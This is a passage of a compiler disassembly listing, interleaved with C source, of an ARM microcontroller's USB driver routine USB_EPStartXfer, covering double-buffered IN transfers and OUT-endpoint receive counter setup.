 80074de:	681b      	ldr	r3, [r3, #0]
 80074e0:	781b      	ldrb	r3, [r3, #0]
 80074e2:	00da      	lsls	r2, r3, #3
 80074e4:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80074e6:	4413      	add	r3, r2
 80074e8:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80074ec:	667b      	str	r3, [r7, #100]	; 0x64
 80074ee:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80074f0:	881b      	ldrh	r3, [r3, #0]
 80074f2:	b29b      	uxth	r3, r3
 80074f4:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80074f8:	b29a      	uxth	r2, r3
 80074fa:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80074fc:	801a      	strh	r2, [r3, #0]
 80074fe:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007502:	2b3e      	cmp	r3, #62	; 0x3e
 8007504:	d921      	bls.n	800754a <USB_EPStartXfer+0xac0>
 8007506:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800750a:	095b      	lsrs	r3, r3, #5
 800750c:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 8007510:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007514:	f003 031f 	and.w	r3, r3, #31
 8007518:	2b00      	cmp	r3, #0
 800751a:	d104      	bne.n	8007526 <USB_EPStartXfer+0xa9c>
 800751c:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 8007520:	3b01      	subs	r3, #1
 8007522:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 8007526:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007528:	881b      	ldrh	r3, [r3, #0]
 800752a:	b29a      	uxth	r2, r3
 800752c:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 8007530:	b29b      	uxth	r3, r3
 8007532:	029b      	lsls	r3, r3, #10
 8007534:	b29b      	uxth	r3, r3
 8007536:	4313      	orrs	r3, r2
 8007538:	b29b      	uxth	r3, r3
 800753a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800753e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007542:	b29a      	uxth	r2, r3
 8007544:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007546:	801a      	strh	r2, [r3, #0]
 8007548:	e050      	b.n	80075ec <USB_EPStartXfer+0xb62>
 800754a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800754e:	2b00      	cmp	r3, #0
 8007550:	d10a      	bne.n	8007568 <USB_EPStartXfer+0xade>
 8007552:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007554:	881b      	ldrh	r3, [r3, #0]
 8007556:	b29b      	uxth	r3, r3
 8007558:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800755c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007560:	b29a      	uxth	r2, r3
 8007562:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007564:	801a      	strh	r2, [r3, #0]
 8007566:	e041      	b.n	80075ec <USB_EPStartXfer+0xb62>
 8007568:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800756c:	085b      	lsrs	r3, r3, #1
 800756e:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 8007572:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007576:	f003 0301 	and.w	r3, r3, #1
 800757a:	2b00      	cmp	r3, #0
 800757c:	d004      	beq.n	8007588 <USB_EPStartXfer+0xafe>
 800757e:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 8007582:	3301      	adds	r3, #1
 8007584:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 8007588:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 800758a:	881b      	ldrh	r3, [r3, #0]
 800758c:	b29a      	uxth	r2, r3
 800758e:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 8007592:	b29b      	uxth	r3, r3
 8007594:	029b      	lsls	r3, r3, #10
 8007596:	b29b      	uxth	r3, r3
 8007598:	4313      	orrs	r3, r2
 800759a:	b29a      	uxth	r2, r3
 800759c:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 800759e:	801a      	strh	r2, [r3, #0]
 80075a0:	e024      	b.n	80075ec <USB_EPStartXfer+0xb62>
 80075a2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075a6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075aa:	681b      	ldr	r3, [r3, #0]
 80075ac:	785b      	ldrb	r3, [r3, #1]
 80075ae:	2b01      	cmp	r3, #1
 80075b0:	d11c      	bne.n	80075ec <USB_EPStartXfer+0xb62>
 80075b2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075b6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80075ba:	681b      	ldr	r3, [r3, #0]
 80075bc:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80075c0:	b29b      	uxth	r3, r3
 80075c2:	461a      	mov	r2, r3
 80075c4:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 80075c6:	4413      	add	r3, r2
 80075c8:	673b      	str	r3, [r7, #112]	; 0x70
 80075ca:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075ce:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075d2:	681b      	ldr	r3, [r3, #0]
 80075d4:	781b      	ldrb	r3, [r3, #0]
 80075d6:	00da      	lsls	r2, r3, #3
 80075d8:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 80075da:	4413      	add	r3, r2
 80075dc:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80075e0:	66fb      	str	r3, [r7, #108]	; 0x6c
 80075e2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80075e6:	b29a      	uxth	r2, r3
 80075e8:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 80075ea:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr1;
 80075ec:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075f0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075f4:	681b      	ldr	r3, [r3, #0]
 80075f6:	895b      	ldrh	r3, [r3, #10]
 80075f8:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 80075fc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007600:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007604:	681b      	ldr	r3, [r3, #0]
 8007606:	6959      	ldr	r1, [r3, #20]
 8007608:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800760c:	b29b      	uxth	r3, r3
 800760e:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8007612:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8007616:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 800761a:	6800      	ldr	r0, [r0, #0]
 800761c:	f000 ff41 	bl	80084a2 <USB_WritePMA>
 8007620:	e0ca      	b.n	80077b8 <USB_EPStartXfer+0xd2e>
        }
        else
        {
          /* Set the Double buffer counter for pmabuffer0 */
          PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 8007622:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007626:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800762a:	681b      	ldr	r3, [r3, #0]
 800762c:	785b      	ldrb	r3, [r3, #1]
 800762e:	2b00      	cmp	r3, #0
 8007630:	d177      	bne.n	8007722 <USB_EPStartXfer+0xc98>
 8007632:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007636:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800763a:	681b      	ldr	r3, [r3, #0]
 800763c:	67fb      	str	r3, [r7, #124]	; 0x7c
 800763e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007642:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007646:	681b      	ldr	r3, [r3, #0]
 8007648:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800764c:	b29b      	uxth	r3, r3
 800764e:	461a      	mov	r2, r3
 8007650:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 8007652:	4413      	add	r3, r2
 8007654:	67fb      	str	r3, [r7, #124]	; 0x7c
 8007656:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800765a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800765e:	681b      	ldr	r3, [r3, #0]
 8007660:	781b      	ldrb	r3, [r3, #0]
 8007662:	00da      	lsls	r2, r3, #3
 8007664:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 8007666:	4413      	add	r3, r2
 8007668:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800766c:	67bb      	str	r3, [r7, #120]	; 0x78
 800766e:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007670:	881b      	ldrh	r3, [r3, #0]
 8007672:	b29b      	uxth	r3, r3
 8007674:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007678:	b29a      	uxth	r2, r3
 800767a:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800767c:	801a      	strh	r2, [r3, #0]
 800767e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007682:	2b3e      	cmp	r3, #62	; 0x3e
 8007684:	d921      	bls.n	80076ca <USB_EPStartXfer+0xc40>
 8007686:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800768a:	095b      	lsrs	r3, r3, #5
 800768c:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 8007690:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007694:	f003 031f 	and.w	r3, r3, #31
 8007698:	2b00      	cmp	r3, #0
 800769a:	d104      	bne.n	80076a6 <USB_EPStartXfer+0xc1c>
 800769c:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 80076a0:	3b01      	subs	r3, #1
 80076a2:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 80076a6:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80076a8:	881b      	ldrh	r3, [r3, #0]
 80076aa:	b29a      	uxth	r2, r3
 80076ac:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 80076b0:	b29b      	uxth	r3, r3
 80076b2:	029b      	lsls	r3, r3, #10
 80076b4:	b29b      	uxth	r3, r3
 80076b6:	4313      	orrs	r3, r2
 80076b8:	b29b      	uxth	r3, r3
 80076ba:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80076be:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80076c2:	b29a      	uxth	r2, r3
 80076c4:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80076c6:	801a      	strh	r2, [r3, #0]
 80076c8:	e05c      	b.n	8007784 <USB_EPStartXfer+0xcfa>
 80076ca:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80076ce:	2b00      	cmp	r3, #0
 80076d0:	d10a      	bne.n	80076e8 <USB_EPStartXfer+0xc5e>
 80076d2:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80076d4:	881b      	ldrh	r3, [r3, #0]
 80076d6:	b29b      	uxth	r3, r3
 80076d8:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80076dc:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80076e0:	b29a      	uxth	r2, r3
 80076e2:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80076e4:	801a      	strh	r2, [r3, #0]
 80076e6:	e04d      	b.n	8007784 <USB_EPStartXfer+0xcfa>
 80076e8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80076ec:	085b      	lsrs	r3, r3, #1
 80076ee:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 80076f2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80076f6:	f003 0301 	and.w	r3, r3, #1
 80076fa:	2b00      	cmp	r3, #0
 80076fc:	d004      	beq.n	8007708 <USB_EPStartXfer+0xc7e>
 80076fe:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 8007702:	3301      	adds	r3, #1
 8007704:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 8007708:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800770a:	881b      	ldrh	r3, [r3, #0]
 800770c:	b29a      	uxth	r2, r3
 800770e:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 8007712:	b29b      	uxth	r3, r3
 8007714:	029b      	lsls	r3, r3, #10
 8007716:	b29b      	uxth	r3, r3
 8007718:	4313      	orrs	r3, r2
 800771a:	b29a      	uxth	r2, r3
 800771c:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800771e:	801a      	strh	r2, [r3, #0]
 8007720:	e030      	b.n	8007784 <USB_EPStartXfer+0xcfa>
 8007722:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007726:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800772a:	681b      	ldr	r3, [r3, #0]
 800772c:	785b      	ldrb	r3, [r3, #1]
 800772e:	2b01      	cmp	r3, #1
 8007730:	d128      	bne.n	8007784 <USB_EPStartXfer+0xcfa>
 8007732:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007736:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800773a:	681b      	ldr	r3, [r3, #0]
 800773c:	f8c7 3084 	str.w	r3, [r7, #132]	; 0x84
 8007740:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007744:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007748:	681b      	ldr	r3, [r3, #0]
 800774a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800774e:	b29b      	uxth	r3, r3
 8007750:	461a      	mov	r2, r3
 8007752:	f8d7 3084 	ldr.w	r3, [r7, #132]	; 0x84
 8007756:	4413      	add	r3, r2
 8007758:	f8c7 3084 	str.w	r3, [r7, #132]	; 0x84
 800775c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007760:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007764:	681b      	ldr	r3, [r3, #0]
 8007766:	781b      	ldrb	r3, [r3, #0]
 8007768:	00da      	lsls	r2, r3, #3
 800776a:	f8d7 3084 	ldr.w	r3, [r7, #132]	; 0x84
 800776e:	4413      	add	r3, r2
 8007770:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007774:	f8c7 3080 	str.w	r3, [r7, #128]	; 0x80
 8007778:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800777c:	b29a      	uxth	r2, r3
 800777e:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 8007782:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr0;
 8007784:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007788:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800778c:	681b      	ldr	r3, [r3, #0]
 800778e:	891b      	ldrh	r3, [r3, #8]
 8007790:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8007794:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007798:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800779c:	681b      	ldr	r3, [r3, #0]
 800779e:	6959      	ldr	r1, [r3, #20]
 80077a0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80077a4:	b29b      	uxth	r3, r3
 80077a6:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80077aa:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80077ae:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 80077b2:	6800      	ldr	r0, [r0, #0]
 80077b4:	f000 fe75 	bl	80084a2 <USB_WritePMA>
        }
      }
    }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

    PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_VALID);
 80077b8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077bc:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80077c0:	681a      	ldr	r2, [r3, #0]
 80077c2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077c6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077ca:	681b      	ldr	r3, [r3, #0]
 80077cc:	781b      	ldrb	r3, [r3, #0]
 80077ce:	009b      	lsls	r3, r3, #2
 80077d0:	4413      	add	r3, r2
 80077d2:	881b      	ldrh	r3, [r3, #0]
 80077d4:	b29b      	uxth	r3, r3
 80077d6:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80077da:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80077de:	817b      	strh	r3, [r7, #10]
 80077e0:	897b      	ldrh	r3, [r7, #10]
 80077e2:	f083 0310 	eor.w	r3, r3, #16
 80077e6:	817b      	strh	r3, [r7, #10]
 80077e8:	897b      	ldrh	r3, [r7, #10]
 80077ea:	f083 0320 	eor.w	r3, r3, #32
 80077ee:	817b      	strh	r3, [r7, #10]
 80077f0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077f4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80077f8:	681a      	ldr	r2, [r3, #0]
 80077fa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077fe:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007802:	681b      	ldr	r3, [r3, #0]
 8007804:	781b      	ldrb	r3, [r3, #0]
 8007806:	009b      	lsls	r3, r3, #2
 8007808:	441a      	add	r2, r3
 800780a:	897b      	ldrh	r3, [r7, #10]
 800780c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8007810:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8007814:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8007818:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800781c:	b29b      	uxth	r3, r3
 800781e:	8013      	strh	r3, [r2, #0]
 8007820:	f000 bcde 	b.w	80081e0 <USB_EPStartXfer+0x1756>
  }
  else /* OUT endpoint */
  {
    if (ep->doublebuffer == 0U)
 8007824:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007828:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800782c:	681b      	ldr	r3, [r3, #0]
 800782e:	7b1b      	ldrb	r3, [r3, #12]
 8007830:	2b00      	cmp	r3, #0
 8007832:	f040 80bb 	bne.w	80079ac <USB_EPStartXfer+0xf22>
    {
      /* Multi packet transfer */
      if (ep->xfer_len > ep->maxpacket)
 8007836:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800783a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800783e:	681b      	ldr	r3, [r3, #0]
 8007840:	699a      	ldr	r2, [r3, #24]
 8007842:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007846:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800784a:	681b      	ldr	r3, [r3, #0]
 800784c:	691b      	ldr	r3, [r3, #16]
 800784e:	429a      	cmp	r2, r3
 8007850:	d917      	bls.n	8007882 <USB_EPStartXfer+0xdf8>
      {
        len = ep->maxpacket;
 8007852:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007856:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800785a:	681b      	ldr	r3, [r3, #0]
 800785c:	691b      	ldr	r3, [r3, #16]
 800785e:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
        ep->xfer_len -= len;
 8007862:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007866:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800786a:	681b      	ldr	r3, [r3, #0]
 800786c:	699a      	ldr	r2, [r3, #24]
 800786e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007872:	1ad2      	subs	r2, r2, r3
 8007874:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007878:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800787c:	681b      	ldr	r3, [r3, #0]
 800787e:	619a      	str	r2, [r3, #24]
 8007880:	e00e      	b.n	80078a0 <USB_EPStartXfer+0xe16>
      }
      else
      {
        len = ep->xfer_len;
 8007882:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007886:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800788a:	681b      	ldr	r3, [r3, #0]
 800788c:	699b      	ldr	r3, [r3, #24]
 800788e:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
        ep->xfer_len = 0U;
 8007892:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007896:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800789a:	681b      	ldr	r3, [r3, #0]
 800789c:	2200      	movs	r2, #0
 800789e:	619a      	str	r2, [r3, #24]
      }
      /* configure and validate Rx endpoint */
      PCD_SET_EP_RX_CNT(USBx, ep->num, len);
 80078a0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80078a4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80078a8:	681b      	ldr	r3, [r3, #0]
 80078aa:	f8c7 3090 	str.w	r3, [r7, #144]	; 0x90
 80078ae:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80078b2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80078b6:	681b      	ldr	r3, [r3, #0]
 80078b8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80078bc:	b29b      	uxth	r3, r3
 80078be:	461a      	mov	r2, r3
 80078c0:	f8d7 3090 	ldr.w	r3, [r7, #144]	; 0x90
 80078c4:	4413      	add	r3, r2
 80078c6:	f8c7 3090 	str.w	r3, [r7, #144]	; 0x90
 80078ca:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80078ce:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80078d2:	681b      	ldr	r3, [r3, #0]
 80078d4:	781b      	ldrb	r3, [r3, #0]
 80078d6:	00da      	lsls	r2, r3, #3
 80078d8:	f8d7 3090 	ldr.w	r3, [r7, #144]	; 0x90
 80078dc:	4413      	add	r3, r2
 80078de:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80078e2:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
 80078e6:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80078ea:	881b      	ldrh	r3, [r3, #0]
 80078ec:	b29b      	uxth	r3, r3
 80078ee:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80078f2:	b29a      	uxth	r2, r3
 80078f4:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80078f8:	801a      	strh	r2, [r3, #0]
 80078fa:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80078fe:	2b3e      	cmp	r3, #62	; 0x3e
 8007900:	d924      	bls.n	800794c <USB_EPStartXfer+0xec2>
 8007902:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007906:	095b      	lsrs	r3, r3, #5
 8007908:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 800790c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007910:	f003 031f 	and.w	r3, r3, #31
 8007914:	2b00      	cmp	r3, #0
 8007916:	d104      	bne.n	8007922 <USB_EPStartXfer+0xe98>
 8007918:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 800791c:	3b01      	subs	r3, #1
 800791e:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007922:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007926:	881b      	ldrh	r3, [r3, #0]
 8007928:	b29a      	uxth	r2, r3
 800792a:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 800792e:	b29b      	uxth	r3, r3
 8007930:	029b      	lsls	r3, r3, #10
 8007932:	b29b      	uxth	r3, r3
 8007934:	4313      	orrs	r3, r2
 8007936:	b29b      	uxth	r3, r3
 8007938:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800793c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007940:	b29a      	uxth	r2, r3
 8007942:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007946:	801a      	strh	r2, [r3, #0]
 8007948:	f000 bc10 	b.w	800816c <USB_EPStartXfer+0x16e2>
 800794c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007950:	2b00      	cmp	r3, #0
 8007952:	d10c      	bne.n	800796e <USB_EPStartXfer+0xee4>
 8007954:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007958:	881b      	ldrh	r3, [r3, #0]
 800795a:	b29b      	uxth	r3, r3
 800795c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007960:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007964:	b29a      	uxth	r2, r3
 8007966:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800796a:	801a      	strh	r2, [r3, #0]
 800796c:	e3fe      	b.n	800816c <USB_EPStartXfer+0x16e2>
 800796e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007972:	085b      	lsrs	r3, r3, #1
 8007974:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007978:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800797c:	f003 0301 	and.w	r3, r3, #1
 8007980:	2b00      	cmp	r3, #0
 8007982:	d004      	beq.n	800798e <USB_EPStartXfer+0xf04>
 8007984:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007988:	3301      	adds	r3, #1
 800798a:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 800798e:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007992:	881b      	ldrh	r3, [r3, #0]
 8007994:	b29a      	uxth	r2, r3
 8007996:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 800799a:	b29b      	uxth	r3, r3
 800799c:	029b      	lsls	r3, r3, #10
 800799e:	b29b      	uxth	r3, r3
 80079a0:	4313      	orrs	r3, r2
 80079a2:	b29a      	uxth	r2, r3
 80079a4:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80079a8:	801a      	strh	r2, [r3, #0]
 80079aa:	e3df      	b.n	800816c <USB_EPStartXfer+0x16e2>
#if (USE_USB_DOUBLE_BUFFER == 1U)
    else
    {
      /* First Transfer Coming From HAL_PCD_EP_Receive & From ISR */
      /* Set the Double buffer counter */
      if (ep->type == EP_TYPE_BULK)
 80079ac:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079b0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079b4:	681b      	ldr	r3, [r3, #0]
 80079b6:	78db      	ldrb	r3, [r3, #3]
 80079b8:	2b02      	cmp	r3, #2
 80079ba:	f040 8218 	bne.w	8007dee <USB_EPStartXfer+0x1364>
      {
        PCD_SET_EP_DBUF_CNT(USBx, ep->num, ep->is_in, ep->maxpacket);
 80079be:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079c2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079c6:	681b      	ldr	r3, [r3, #0]
 80079c8:	785b      	ldrb	r3, [r3, #1]
 80079ca:	2b00      	cmp	r3, #0
 80079cc:	f040 809d 	bne.w	8007b0a <USB_EPStartXfer+0x1080>
 80079d0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079d4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80079d8:	681b      	ldr	r3, [r3, #0]
 80079da:	f8c7 30ac 	str.w	r3, [r7, #172]	; 0xac
 80079de:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079e2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80079e6:	681b      	ldr	r3, [r3, #0]
 80079e8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80079ec:	b29b      	uxth	r3, r3
 80079ee:	461a      	mov	r2, r3
 80079f0:	f8d7 30ac 	ldr.w	r3, [r7, #172]	; 0xac
 80079f4:	4413      	add	r3, r2
 80079f6:	f8c7 30ac 	str.w	r3, [r7, #172]	; 0xac
 80079fa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079fe:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a02:	681b      	ldr	r3, [r3, #0]
 8007a04:	781b      	ldrb	r3, [r3, #0]
 8007a06:	00da      	lsls	r2, r3, #3
 8007a08:	f8d7 30ac 	ldr.w	r3, [r7, #172]	; 0xac
 8007a0c:	4413      	add	r3, r2
 8007a0e:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007a12:	f8c7 30a8 	str.w	r3, [r7, #168]	; 0xa8
 8007a16:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a1a:	881b      	ldrh	r3, [r3, #0]
 8007a1c:	b29b      	uxth	r3, r3
 8007a1e:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007a22:	b29a      	uxth	r2, r3
 8007a24:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a28:	801a      	strh	r2, [r3, #0]
 8007a2a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a2e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a32:	681b      	ldr	r3, [r3, #0]
